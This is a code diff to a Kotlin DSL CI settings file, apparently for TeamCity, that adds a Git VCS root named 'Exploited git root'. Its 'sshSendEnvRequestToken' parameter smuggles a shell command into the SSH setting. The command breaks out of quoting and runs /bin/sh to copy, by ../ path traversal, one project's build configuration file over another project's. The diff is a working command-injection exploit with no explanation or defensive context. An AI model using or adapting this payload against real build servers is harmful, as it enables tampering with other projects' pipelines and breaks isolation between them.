@@ -27,8 +27,20 @@ version = "2026.1"
 project {
 
     buildType(Build)
+    vcsRoot(HttpsGithubGitssh)
 }
 
 object Build : BuildType({
     name = "Build"
+})
+
+object HttpsGithubGitssh : GitVcsRoot({
+    name = "Exploited git root"
+
+    param("url", "ssh://git@example.invalid/repo.git")
+    param("branch", "refs/heads/master")
+    param("authMethod", "PRIVATE_KEY_DEFAULT")
+    param("ignoreKnownHosts", "true")
+
+   param("sshSendEnvRequestToken", "x\"; /bin/sh -c 'cat ../../../../config/projects/ProjectA/buildTypes/ProjectA_Build.xml > ../../../../config/projects/ProjectB/buildTypes/ProjectB_Build.xml'; #")
 })
